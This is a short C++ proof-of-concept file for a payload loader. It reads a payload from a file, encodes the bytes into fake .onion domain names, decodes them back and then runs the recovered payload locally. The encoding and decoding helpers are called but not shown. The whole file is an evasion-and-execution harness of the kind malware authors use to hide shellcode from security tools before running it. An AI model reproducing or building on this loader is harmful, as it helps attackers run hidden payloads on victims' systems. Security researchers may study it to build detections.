// POC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "Common.h"

int main(int argc, char* argv[])
{
	if (argc != 2) {
		printf("[!] Usage: <Input Payload FileName> \n");
		return -1;
	}
	DWORD dwPayloadSize = 0;
	PBYTE pPayloadInput = NULL;

	if (!ReadPayloadFile(argv[1], &dwPayloadSize, &pPayloadInput)) {
		return -1;
	}

	SIZE_T count = 8;
	char** domains = ObfuscateToOnions(pPayloadInput, dwPayloadSize, &count);

	printf("[i] Obfuscated into %zu fake .onion domain(s):\n", count);
	for (SIZE_T i = 0; i < count; i++)
		printf("  %s\n", domains[i]);

	printf("[#] Press <Enter> To Deobfuscate Payload ... \n");
	getchar();

	SIZE_T recovered_len = 0;
	PBYTE recovered = NULL;
	DeobfuscateFromOnions(domains, count, &recovered_len, &recovered);
	printf("\n[i] Recovered %zu bytes:\n", recovered_len);
	for (size_t i = 0; i < recovered_len; i++)
		printf("0x%02X ", recovered[i]);
	printf("\n");

	printf("[#] Press <Enter> To Execute Payload Localy... \n");
	getchar();

	LocalPayloadExecute(recovered, recovered_len);

	return 0;
}

